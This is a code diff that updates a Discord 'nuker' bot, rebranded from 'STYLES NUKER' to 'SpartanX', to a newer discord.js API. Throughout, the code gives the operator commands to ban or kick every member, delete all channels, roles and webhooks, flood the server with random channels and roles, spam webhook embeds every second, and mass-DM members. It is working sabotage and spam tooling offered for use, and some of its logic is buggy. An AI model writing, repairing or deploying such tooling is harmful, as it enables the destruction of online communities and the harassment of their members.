@@ -1,14 +1,27 @@
-console.clear();
-process.title = '[STYLES] - Loading..'
 const { magentaBright, white, blackBright } = require('chalk');
-const { prefix, webhookNames, roleNames, channelNames, fieldNames, randomLinks } = require('./config.json');
+const config = require('./config.json');
+const { Client, EmbedBuilder, GatewayIntentBits } = require('discord.js');
 
-const { Client, MessageEmbed } = require('discord.js')
-const client = new Client();
+const client = new Client({
+    intents: [
+        GatewayIntentBits.Guilds,
+        GatewayIntentBits.GuildMembers,
+        GatewayIntentBits.GuildMessages,
+        GatewayIntentBits.GuildVoiceStates,
+        GatewayIntentBits.MessageContent,
+    ]
+});
+
+process.title = '[SpartanX] - Loading..'
 
 client.once('ready', async () => {	
-    try { var lietnUser = await client.users.fetch(require('./config.json').id).then(u => u.tag); } catch (e) { };
-    process.title = `[STYLES NUKER] - Connected ${lietnUser}`
+    try { 
+        var lietnUser = await client.users.fetch(config.dev_id).then(u => u.tag); 
+    } catch (e) { 
+        //
+    };
+
+    process.title = `[SpartanX] - Connected ${lietnUser}`
     console.log(` `);
     console.log(` `);
     console.log(white('                               #####  ####### #     # #       #######  #####  '));
@@ -21,200 +34,198 @@ client.once('ready', async () => {
     console.log(` `);
     console.log(` `);
     console.log(magentaBright(' [') + white('?') + magentaBright(']') + white(` Listening for`) + magentaBright(': ') + white(lietnUser));
-
 });
 
 const fs = require('fs');
 
 client.on('rateLimit', () => {
-    console.log(magentaBright(' [') + white('!') + magentaBright('] ') + white('Rate Limited, Sleeping for ') + magentaBright(0) + white(' seconds'));
+    console.log("[+++] THE IP BEING RATELIMIT!!!!!!");
 });
 
-client.once('message', async (message) => {
-    if (message.author.id !== require('./config.json').id) return
-    if (!message.content.startsWith(prefix)) return;
-    const args = message.content.slice(prefix.length).trim().split(/ +/g);
+client.on("messageCreate", async (message) => {
+    if (message.author.id !== config.dev_id) return;
+    if (!message.content.startsWith(config.prefix)) return;
+
+    const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
     const command = args.shift().toLocaleLowerCase();
 
     if (command === 'b' || command === 'ban') {
-        for (let i = 0; i < message.guild.members.cache.array().length; i++) {
-            let u = message.guild.members.cache.array()[i];
+        // Ban Members
+        Ban(message);
+    }
 
-            u.ban({ reason: "BEST DISCORD TOOL | STYLES NUKER" }).then(() => {
-                console.log(magentaBright(' [') + white('+') + magentaBright('] ') + white('Banned ') + magentaBright(u.user.tag));
-            }).catch(() => {
-                console.log(magentaBright(' [') + white('-') + magentaBright('] ') + white('Couldn\'t Ban ') + magentaBright(u.user.tag));
-            });
-        };
-
-        message.guild.members.cache.forEach(mm => {
-
-            mm.ban({
-                reason: "BEST DISCORD TOOL | STYLES NUKER"
-            }).then(() => {
-                console.log(magentaBright(' [') + white('+') + magentaBright('] ') + white('Banned ') + magentaBright(mm.user.tag));
-            }).catch(() => {
-            });
-        });
-    };
     if (command === 'kick' || command === 'k') {
-        for (let i = 0; i < message.guild.members.cache.array().length; i++) {
-            let u = message.guild.cache.members.array()[i];
-
-            u.kick().then(() => {
-                console.log(magentaBright(' [') + white('+') + magentaBright('] ') + white('Kicked ') + magentaBright(u.user.tag));
-            }).catch(() => {
-                console.log(magentaBright(' [') + white('-') + magentaBright('] ') + white('Couldn\'t Kick ') + magentaBright(u.user.tag));
-            });
-        };
-
-        message.guild.members.cache.forEach(mm => {
-            mm.ban({ reason: "BEST DISCORD TOOL | STYLES NUKER" }).then(() => {
-                console.log(magentaBright(' [') + white('+') + magentaBright('] ') + white('Kicked ') + magentaBright(u.user.tag));
-            }).catch(() => {
-            });
-        });
+        // Kick Members
+        Kick(message);
     };
 
-    if (command === 'ww') {
-        process.nextTick(() => {
-            for (let i = 0; i < message.guild.members.cache.array().length; i++) {
-                let u = message.guild.members.cache.array()[i];
+    if (command === 'dm') {
+        // Kick Members
+        Direct(message, args[0]);
+    };
 
-                u.ban({ reason: "BEST DISCORD TOOL | STYLES NUKER" }).then(() => {
-                    console.log(magentaBright(' [') + white('+') + magentaBright('] ') + white('Banned ') + magentaBright(u.user.id));
-                }).catch(() => {
-                    console.log(magentaBright(' [') + white('-') + magentaBright('] ') + white('Couldn\'t Ban ') + magentaBright(u.user.tag));
-                });
-            };
+    if (command === 'nuke') {
+        // Delete Channels + Webhooks + Roles
+        Delete(message);
+        DeleteWebhook(message);
+        // Create Channels + Webhooks + Roles + Send Messages
+        Create(message);
+    };
+});
 
-            message.guild.members.cache.forEach(mm => {
-                mm.ban({ reason: "BEST DISCORD TOOL | STYLES NUKER" }).then(() => {
-                    console.log(magentaBright(' [') + white('+') + magentaBright('] ') + white('Banned ') + magentaBright(mm.user.tag)); 0
-                }).catch(() => {
-                });
-            });
+client.login(config.token);
 
-            for (let i = 0; i < message.guild.members.cache.array().length; i++) {
-                let u = message.guild.members.cache.array()[i];
 
-                u.kick().then(() => {
-                    console.log(magentaBright(' [') + white('+') + magentaBright('] ') + white('Kicked ') + magentaBright(u.user.tag));
-                }).catch(() => {
-                    console.log(magentaBright(' [') + white('-') + magentaBright('] ') + white('Couldn\'t Kick ') + magentaBright(u.user.tag));
-                });
-            };
 
-            message.guild.members.cache.forEach(mm => {
-                mm.ban({ reason: "BEST DISCORD TOOL | STYLES NUKER" }).then(() => {
-                    console.log(magentaBright(' [') + white('+') + magentaBright('] ') + white('Kicked ') + magentaBright(mm.user.tag));
-                }).catch(() => {
-                });
-            });
-        });
-        message.guild.channels.cache.forEach(ch => {
-            ch.delete().then(() => {
-                console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Deleted channel ') + magentaBright(ch.id));
+async function Ban(message) { // Ban Members
+    // Ban Members
+    message.guild.members.fetch().then(m => {
+        m.forEach(s => {
+            s.ban({ user: m.user.id, reason: "Goodbye <3"}).then(() => {
+                console.log('[-] Baned ', m.id)
             }).catch(() => {
-                console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Couldn\'t Deleted channel ') + magentaBright(ch.id));
+                console.log('[+] Couldn\'t Baned', m.id)
             });
-        });
+        })
+    })
+}
 
+async function Kick(message) { // Delete Channels
+    // Kick Members
+    message.guild.members.fetch().then(m => {
+        m.forEach(s => {
+            s.kick({ user: m.user.id, reason: "Goodbye <3"}).then(() => {
+                console.log('[-] Kicked ', m.id)
+            }).catch(() => {
+                console.log('[+] Couldn\'t Kicked', m.id)
+            });
+        })
+    })
+}
+
+async function Delete(message) { // Delete Channels & Roles
+    // Delete Channels
+    message.guild.channels.fetch().then(c => {
+        c.forEach(s => {
+            s.delete().then(() => {
+                console.log('[-] Deleted channel', s.id)
+            }).catch(() => {
+                console.log('[+] Couldn\'t delete channel', s.id)
+            });
+        })
+    })
+    // Delete Roles
+    message.guild.roles.fetch().then(r => {
+        r.forEach(s => {
+            s.delete().then(() => {
+                console.log('[-] Deleted role', s.id)
+            }).catch(() => {
+                console.log('[+] Couldn\'t delete role', s.id)
+            });
+        })
+    })
+}
+
+async function Create(message) { // Create Channels & Roles
+
+    // Create Channels
+    for (let i = 0; i < config.amount; i++) {
+        message.guild.channels.create({
+            type: 0,
+            name: crypto.randomUUID(),
+            topic: "Made By: Nanotect."
+        }).then(c => {
+            console.log('[+] Create Channel', c.id)
+            // Create Webhook
+            if(++i == config.amount) {
+                Webhook(message);
+            }
+        }).catch(() => {
+            console.log('[-] Couldn\'t Create Channel')
+        });
+    }
+
+    // Create Roles
+    for (let i = 0; i < config.amount; i++) {
+        message.guild.roles.create({
+            name: crypto.randomUUID(),
+            color: "Random",
+        }).then(c => {
+            console.log('[+] Create Roles', c.id)
+        }).catch(() => {
+            console.log('[-] Couldn\'t Create Roles')
+        });
+    }
+}
+
+async function Webhook(message) { // Create Webhooks
+    message.guild.channels.fetch().then(c => {
+        c.forEach(s => {
+            s.createWebhook({
+                name: 'Test',
+                avatar: 'https://i.imgur.com/AfFp7pu.png', 
+            }).then(webhook => {
+                console.log("[+] Created webhook", webhook.id);
+                // Send Message
+                SendWebhook(webhook);
+            }).catch(() => {
+                console.log('[-] Couldn\'t create webhook');
+            });
+        })
+    })
+}
+
+async function SendWebhook(webhook) { // Send Messages
+    setInterval(() => {
         const normal = fs.readFileSync('./messages/normal.txt', 'utf8');
         const description = fs.readFileSync('./messages/description.txt', 'utf8');
-        const fieldvalue1 = fs.readFileSync('./messages/fieldvalue1.txt', 'utf8');
-        const fieldvalue2 = fs.readFileSync('./messages/fieldvalue1.txt', 'utf8');
+        const field = fs.readFileSync('./messages/field.txt', 'utf8');
         const footer = fs.readFileSync('./messages/footer.txt', 'utf8');
-
-        const embed = new MessageEmbed()
-            .setAuthor('STYLES ONTOP', `${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`, `${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`)
-            .setColor('RANDOM')
-            .setTitle('STYLES IS A BEST TOOL EVER!')
+    
+        const randomLinks = config.randomLinks;
+    
+        const embed = new EmbedBuilder()
+            .setAuthor({ name: 'SpartanX', url: `${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`, iconURL: `${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`})
+            .setColor("Random")
+            .setTitle('SpartanX is best tool ever!')
             .setURL(`${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`)
             .setImage(`${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`)
             .setThumbnail(`${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`)
             .setDescription(description)
-            .setFooter(footer, `${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`)
-            .addField(`${fieldNames[Math.floor(Math.random() * fieldNames.length)]}`, fieldvalue1)
-            .addField(`${fieldNames[Math.floor(Math.random() * fieldNames.length)]}`, fieldvalue1)
-            .addField(`${fieldNames[Math.floor(Math.random() * fieldNames.length)]}`, fieldvalue2)
-            .addField(`${fieldNames[Math.floor(Math.random() * fieldNames.length)]}`, fieldvalue2)
+            .setFooter({ text: footer, iconURL: `${randomLinks[Math.floor(Math.random() * randomLinks.length)]}` })
+            .addFields({ name: crypto.randomUUID(), value: field })
+            .addFields({ name: crypto.randomUUID(), value: field })
+            .addFields({ name: crypto.randomUUID(), value: field })
+            .addFields({ name: crypto.randomUUID(), value: field })
             .setTimestamp();
 
-        setInterval(() => {
-            message.guild.channels.create(channelNames[Math.floor(Math.random() * channelNames.length)], { type: 'text', topic: 'Made By R3FLECT' }).then((channel) => {
-                console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Created channel ') + magentaBright(channel.id))
-                setInterval(() => {
-                    channel.send(normal, embed).then((msg) => {
-                        console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Sent message ') + magentaBright(msg.id))
-                    }).catch(() => {
-                        console.log(magentaBright(' [') + white('-') + magentaBright(']') + white(' Couldn\'t send message '));
-                    });
-                });
-                    channel.createWebhook(webhookNames[Math.floor(Math.random() * webhookNames.length)]).then((webhook) => {
-                        console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Created webhook ') + magentaBright(webhook.id));
+        webhook.send({ content: normal, embeds: [embed] })
+    }, 1000)
+}
 
-                        setInterval(() => {
-                            webhook.send(normal, embed).then((msg) => {
-                                console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Sent webhook message ') + magentaBright(msg.id))
-                            }).catch(() => {
-                                console.log(magentaBright(' [') + white('-') + magentaBright(']') + white(' Couldn\'t send webhook message '))
-                            });
-                        });
-                    }).catch(() => {
-                        console.log(magentaBright(' [') + white('-') + magentaBright(']') + white(' Couldn\'t create webhook '))
-                    });
-                    channel.createWebhook(webhookNames[Math.floor(Math.random() * webhookNames.length)]).then((webhook) => {
-                        console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Created webhook ') + magentaBright(webhook.id));
+async function DeleteWebhook(message) { // Delete Webhooks
+    message.guild.fetchWebhooks().then(r => {
+        r.forEach(s => {
+            s.delete().then(() => {
+                console.log('[-] Deleted webhook', s.id)
+            }).catch(() => {
+                console.log('[+] Couldn\'t delete webhook', s.id)
+            });
+        })
+    })
+}
 
-                        setInterval(() => {
-                            webhook.send(normal, embed).then((msg) => {
-                                console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Sent webhook message ') + magentaBright(msg.id))
-                            }).catch(() => {
-                                console.log(magentaBright(' [') + white('-') + magentaBright(']') + white(' Couldn\'t send webhook message '))
-                            });
-                        });
-                    }).catch(() => {
-                        console.log(magentaBright(' [') + white('-') + magentaBright(']') + white(' Couldn\'t create webhook '))
-                    });
+async function Direct(message, args) { // Direct Messages
+    message.guild.members.fetch().then(m => {
+        m.forEach(s => {
+            // Check if bot!
+            if(s.user.bot) return;
+
+            s.send(args).then(() => {
+                console.log('[-] Direct', s.id)
             }).catch(() => {
-                console.log(magentaBright(' [') + white('-') + magentaBright(']') + white(' Couldn\'t create channel '))
-            });;
-        });
-        message.guild.roles.cache.forEach(((role) => {
-            role.delete().then(() => {
-                console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Deleted role ') + magentaBright(role.id))
-            }).catch(() => {
-                console.log(magentaBright(' [') + white('-') + magentaBright(']') + white(' Couldn\'t delete role '))
+                console.log('[+] Couldn\'t Direct', s.id)
             });
-        }));
-        setTimeout(() => {
-            setInterval(() => {
-                message.guild.roles.create({
-                    data: {
-                        name: roleNames[Math.floor(Math.random() * roleNames.length)],
-                        color: "RANDOM",
-                    }
-                }).then((role) => {
-                    console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Created role ') + magentaBright(role.id));
-                }).catch(() => {
-                    console.log(magentaBright(' [') + white('-') + magentaBright(']') + white(' Couldn\'t create role '));
-                });
-            });
-        }, 2000);
-    };
-});
-const token = fs.readFileSync('./token.txt', 'utf8');
-client.login(token).catch(() => {
-    console.log(` `);
-    console.log(` `);
-    console.log(white('                               #####  ####### #     # #       #######  #####  '));
-    console.log(white('                              #     #    #     #   #  #       #       #     # '));
-    console.log(blackBright('                              #          #      # #   #       #       #       '));
-    console.log(blackBright('                               #####     #       #    #       #####    #####  '));
-    console.log(magentaBright('                                    #    #       #    #       #             # '));
-    console.log(magentaBright('                              #     #    #       #    #       #       #     # '));
-    console.log(magentaBright('                               #####     #       #    ####### #######  #####  '));
-	console.log(` `);
-    console.log(`                                ${magentaBright('[')}${white('!')}${magentaBright(']')}${white('token error please check your bot token?')}`);
-}); 
+        })
+    })
+}
